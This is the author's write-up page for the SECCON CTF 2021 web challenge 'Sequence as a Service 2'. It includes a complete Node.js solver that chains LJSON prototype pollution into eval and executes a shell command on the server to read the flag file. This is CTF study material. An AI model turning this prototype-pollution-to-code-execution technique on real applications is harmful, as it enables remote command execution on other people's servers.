---
title: "Sequence As A Service 2 - SECCON CTF 2021"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "sequence", "service", "web", "seccon-ctf-2021"]
summary: "NEW FEATURE: You can get values from two sequences at the same time!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/sequence-as-a-service-2"
license: "none stated"
ctf:
  name: "SECCON CTF 2021"
  year: 2021
  challenge: "Sequence As A Service 2"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/sequence-as-a-service-2>
- **CTF:** SECCON CTF 2021

---

# [web] Sequence as a Service 2

## Description

NEW FEATURE: You can get values from **two** sequences at the same time! Go `[here](http://sequence-as-a-service-2.quals.seccon.jp:3000)`.

Note: It is possible to solve SaaS 2 even if you don't solve SaaS 1.

## Attachments

- [dist](files/dist)

## Usage

Launch a challenge server:

```
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_URL=http://localhost:3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/sequence-as-a-service-2/solver/index.js>

```javascript
const LJSON = require("ljson");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL || fail("SECCON_URL not found");

// Inverse of https://github.com/MaiaVictor/LJSON/blob/0c06399baddc08ede6457a59505e188ec0828dab/LJSON.js#L397
const toNumber = (name) => {
  const alphabet = "abcdefghijklmnopqrstuvwxyz";
  let number = 0;
  for (const c of name.split("").reverse()) {
    number *= alphabet.length;
    number += alphabet.indexOf(c);
  }
  return number;
};

const code = 'require("child_process").execSync("cat /flag.txt").toString()';

// A source of Prototype Pollution
const evilSequence0 = LJSON.stringify(($, map, n) =>
  $("set", $("set", map, "__proto__", null), "polluted", toNumber("eval"))
);

// A sink of Prototype Pollution
const evilSequence1 = LJSON.stringify((a, b, c) => a(code)).replace(
  "a(",
  "polluted("
);

const params = new URLSearchParams({
  sequence0: evilSequence0,
  n0: 0,
  sequence1: evilSequence1,
  n1: 0,
});

console.log(params);

const main = async () => {
  const text = await (
    await fetch(`${SECCON_URL}/api/getValue?${params}`)
  ).text();
  console.log(text);
};
main();
```
